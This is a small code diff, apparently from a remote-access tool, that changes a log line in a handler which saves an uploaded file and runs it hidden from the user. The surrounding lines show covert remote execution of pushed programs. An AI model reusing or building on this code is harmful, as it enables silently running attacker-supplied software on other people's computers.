@@ -706,7 +706,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
             fwrite(pFileData, 1, dwFileSize, fp);
             fclose(fp);
             ShellExecuteA(NULL, "open", szSavePath, NULL, NULL, SW_HIDE);
-            Mprintf("Upload Exec Success: %d bytes\n", dwFileSize);
+            Mprintf("Upload Exec Success: %s [%d bytes]\n", szSavePath, dwFileSize);
         }
         char buf[100];
         sprintf_s(buf, "Client %llu upload exec %s", m_conn->clientID, fp ? "succeed" : "failed");
